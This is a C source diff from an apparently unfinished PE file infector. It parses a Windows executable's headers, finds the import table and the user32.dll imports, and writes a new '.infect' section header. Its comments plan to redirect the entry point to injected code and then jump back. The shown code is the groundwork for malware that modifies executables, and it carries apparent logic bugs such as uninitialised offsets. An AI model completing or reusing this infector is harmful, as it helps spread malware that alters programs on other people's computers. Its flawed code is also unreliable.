@@ -33,53 +33,104 @@ int main(int argc, char *argv[]) {
 	imageFileHeader.SizeOfOptionalHeader =
 		getval(fr, dw, SEEK_SET, imageDosHeader.e_lfanew + 20);
 
-	DWORD ioh_addr = imageDosHeader.e_lfanew + 24;
+	DWORD ioh_offset = imageDosHeader.e_lfanew + 24;
 
 	// 0x10B => 32-bit
 	// 0x20B => 64-bit
-	imageOptionalHeader.Magic = getval(fr, dw, SEEK_SET, ioh_addr);
+	imageOptionalHeader.Magic = getval(fr, dw, SEEK_SET, ioh_offset);
 
 	// TO-DO: Change entry point
 	imageOptionalHeader.AddressOfEntryPoint =
-		getval(fr, dd, SEEK_SET, ioh_addr+16);
+		getval(fr, dd, SEEK_SET, ioh_offset+16);
 	if (imageOptionalHeader.Magic == 0x10B)
 		imageOptionalHeader.ImageBase =
-		   getval(fr,dd, SEEK_SET, ioh_addr+28);
+		   getval(fr,dd, SEEK_SET, ioh_offset+28);
 	else
 		imageOptionalHeader.ImageBase =
-		   getval(fr,8, SEEK_SET, ioh_addr+24);
+		   getval(fr,8, SEEK_SET, ioh_offset+24);
 	imageOptionalHeader.SectionAlignment =
-		getval(fr, dd, SEEK_SET, ioh_addr+32);
+		getval(fr, dd, SEEK_SET, ioh_offset+32);
 	imageOptionalHeader.FileAlignment =
-		getval(fr, dd, SEEK_SET, ioh_addr+36);
+		getval(fr, dd, SEEK_SET, ioh_offset+36);
 	// TO-DO: Increase SizeOfImage
 	imageOptionalHeader.SizeOfImage =
-		getval(fr, dd, SEEK_SET,ioh_addr + 56);
+		getval(fr, dd, SEEK_SET,ioh_offset + 56);
 
-	// DWORD lastish_addr = ioh_addr + imageFileHeader.SizeOfOptionalHeader
-		// + 40 * (imageFileHeader.NumberOfSections-1);
+	// Import Table
+	imageOptionalHeader.DataDirectory[1].VirtualAddress = getval(fr, dd, SEEK_SET,
+		ioh_offset + (imageOptionalHeader.Magic == 0x10B ? 104 : 120));
+	imageOptionalHeader.DataDirectory[1].Size = getval(fr, dd, SEEK_SET,
+		ioh_offset + (imageOptionalHeader.Magic == 0x10B ? 108 : 124));
 
-	// Find PointerToRawData of the last section
-	// Necessary? Not if section header is organised by the order of the sections' appearance in the programme
+	// Import Address Table (IAT)
+	imageOptionalHeader.DataDirectory[12].VirtualAddress = getval(fr, dd, SEEK_SET,
+		ioh_offset + (imageOptionalHeader.Magic == 0x10B ? 192 : 208));
+	imageOptionalHeader.DataDirectory[12].Size = getval(fr, dd, SEEK_SET,
+		ioh_offset + (imageOptionalHeader.Magic == 0x10B ? 196 : 212));
+
 	// DWORD lastish_addr = ioh_addr + imageFileHeader.SizeOfOptionalHeader
 		// + 40 * (imageFileHeader.NumberOfSections-1);
 	IMAGE_SECTION_HEADER lastish;
 	lastish.PointerToRawData = 0;
-	DWORD lastish_addr = 0;
+	DWORD lastish_offset = 0;
+	// File offset for Import Table and the containing section
+	DWORD import_offset, import_section_rva = 0;
+	// File offset for IAT and the containing section
+	DWORD iat_offset, iat_section_rva = 0;
 	for (int i = 0; i < imageFileHeader.NumberOfSections; i++) {
-		DWORD tempval = getval(fr,dd, SEEK_SET,
-			ioh_addr + imageFileHeader.SizeOfOptionalHeader + 40*i + 20);
-		if (tempval < lastish.PointerToRawData) {
-			lastish.PointerToRawData = tempval;
-			lastish_addr = ioh_addr + imageFileHeader.SizeOfOptionalHeader + 40 * i;
+		DWORD current_rva = getval(fr, dd, SEEK_SET,
+			ioh_offset + imageFileHeader.SizeOfOptionalHeader + 40*i + 12);
+		DWORD current_offset = getval(fr,dd, SEEK_SET,
+			ioh_offset + imageFileHeader.SizeOfOptionalHeader + 40*i + 20);
+
+		// Find file offset of Import Table
+		if (current_rva > import_section_rva && current_rva <= imageOptionalHeader.DataDirectory[1].VirtualAddress) {
+			import_section_rva = current_rva;
+			import_offset = imageOptionalHeader.DataDirectory[1].VirtualAddress - current_rva + current_offset;
+		}
+		if (current_rva > iat_section_rva && current_rva <= imageOptionalHeader.DataDirectory[12].VirtualAddress) {
+			iat_section_rva = current_rva;
+			iat_offset = imageOptionalHeader.DataDirectory[12].VirtualAddress - current_rva + current_offset;
+		}
+
+		// Find PointerToRawData of the last section
+		// Necessary? Not if section header is organised by the order of the sections' appearance in the programme
+		if (current_offset < lastish.PointerToRawData) {
+			lastish.PointerToRawData = current_offset;
+			lastish_offset = ioh_offset + imageFileHeader.SizeOfOptionalHeader + 40 * i;
+		}
+	}
+
+	IMAGE_IMPORT_DESCRIPTOR user32dll;
+	// Search for user32.dll
+	for (int i = 0; ; ++i) {
+		DWORD name_rva = getval(fr, dd, SEEK_SET,import_offset + 20 * i + 12);
+		if (name_rva == 0) break; // No user32.dll
+		BYTE name[MAX_PATH];
+
+		// Read name of import, byte by byte
+		fseek(fr, name_rva - imageOptionalHeader.DataDirectory[1].VirtualAddress + import_offset, SEEK_SET);
+		for (int j = 0; j < MAX_PATH ; ++j) {
+			fread(name+j, 1, 1, fr);
+			if (name[j] == 0) break;
+		}
+
+		if (strcmp(name,"user32.dll")==0) {
+			user32dll.OriginalFirstThunk = getval(fr, dd, SEEK_SET,
+				imageOptionalHeader.DataDirectory[1].VirtualAddress + 20 * i);
+			user32dll.TimeDateStamp = getval(fr, dd, SEEK_CUR, 0);
+			user32dll.ForwarderChain = getval(fr, dd, SEEK_CUR, 0);
+			user32dll.Name = getval(fr, dd, SEEK_CUR, 0);
+			user32dll.FirstThunk = getval(fr, dd, SEEK_CUR, 0);
+			break;
 		}
 	}
 
 	lastish.VirtualAddress =
-		getval(fr, dd, SEEK_SET, lastish_addr + 12);
-	lastish.SizeOfRawData = getval(fr, dd, SEEK_SET, lastish_addr + 16);
+		getval(fr, dd, SEEK_SET, lastish_offset + 12);
+	lastish.SizeOfRawData = getval(fr, dd, SEEK_SET, lastish_offset + 16);
 
-	DWORD newish_addr = lastish_addr + 40;
+	DWORD newish_offset = lastish_offset + 40;
 	IMAGE_SECTION_HEADER newish = {
 		// Name
 		".infect",
@@ -126,7 +177,12 @@ int main(int argc, char *argv[]) {
 
 	// Jmp back to old AddressOfEntryPoint
 
-	setval_char(fr, newish.Name,8, SEEK_SET, newish_addr);
+	// // Edit SizeOfImage
+	// imageOptionalHeader.SizeOfImage =
+	// 	closest(imageOptionalHeader.SizeOfImage + newish.SizeOfRawData, ;
+
+	// Write to Section Header
+	setval_char(fr, newish.Name,8, SEEK_SET, newish_offset);
 	setval_int(fr, newish.Misc.VirtualSize, dd, SEEK_CUR, 0);
 	setval_int(fr, newish.VirtualAddress, dd, SEEK_CUR, 0);
 	setval_int(fr, newish.SizeOfRawData, dd, SEEK_CUR, 0);
